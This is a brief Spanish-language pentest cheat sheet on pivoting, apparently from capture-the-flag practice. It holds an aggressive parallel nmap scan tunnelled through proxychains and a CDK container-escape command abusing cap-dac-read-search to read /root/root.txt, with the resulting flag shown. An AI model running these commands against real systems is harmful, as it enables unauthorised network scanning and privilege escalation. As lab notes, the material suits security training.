# pivoting

# Pivoting

## Escaneo ultragresivo con nmap

```
seq 1 65535 | xargs -P 200 -I {} proxychains nmap -p{} -sT -Pn -v -n 10.197.243.77 -vvv 2>/dev/null | grep "tcp open"
```

## Uso de de CDK

### Exfiltración de archivos

```
root@c150397ccd63:~# ./cdk run cap-dac-read-search /root/root.txt
Running with target: /root/root.txt, ref: /etc/hostname
33f94f70a5d8d427f1fcd10b555422e2
```